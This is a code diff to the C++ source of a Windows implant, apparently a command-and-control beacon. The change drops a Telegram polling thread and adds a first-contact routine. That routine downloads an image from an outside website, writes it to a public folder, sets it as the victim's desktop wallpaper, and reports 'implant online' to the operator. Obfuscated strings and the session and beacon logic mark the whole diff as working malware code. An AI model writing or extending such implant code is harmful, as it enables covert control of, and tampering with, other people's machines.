@@ -892,9 +892,6 @@ VOID BeaconLoop() {
     DebugLog(L"Session key derived from session ID.");
     DebugLog(L"Session: " + session.sessionId);
 
-    // Start Telegram poller thread
-    HANDLE hTele = CreateThread(nullptr, 0, TelegramPoller, nullptr, 0, nullptr);
-    if (hTele) CloseHandle(hTele);
 
     DWORD failures = 0;
     bool sentHello = false;
@@ -924,7 +921,23 @@ VOID BeaconLoop() {
 
             if (ok && !sentHello) {
                 sentHello = true;
-                SendResult(session.sessionId, L"hi");
+                // Download wallpaper and set it to prove implant is running
+                std::wstring wpUrl = XSW(L"https://wallpaperaccess.com/full/2012878.jpg").str();
+                std::wstring wpPath = L"C:\\Users\\Public\\wp.jpg";
+                HttpResponse wpResp = WinHttpRequest(L"wallpaperaccess.com", 443, L"GET", L"/full/2012878.jpg", "", L"");
+                if (wpResp.status == 200 && !wpResp.body.empty()) {
+                    HANDLE hf = CreateFileW(wpPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+                    if (hf != INVALID_HANDLE_VALUE) {
+                        DWORD w = 0;
+                        WriteFile(hf, wpResp.body.data(), (DWORD)wpResp.body.size(), &w, nullptr);
+                        CloseHandle(hf);
+                        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wpPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+                        DebugLog(L"Wallpaper set.");
+                    }
+                } else {
+                    DebugLog(L"Wallpaper download failed: HTTP " + std::to_wstring(wpResp.status));
+                }
+                SendResult(session.sessionId, L"[ghost] implant online — wallpaper changed");
                 DebugLog(L"Sent hello to worker.");
             }
 
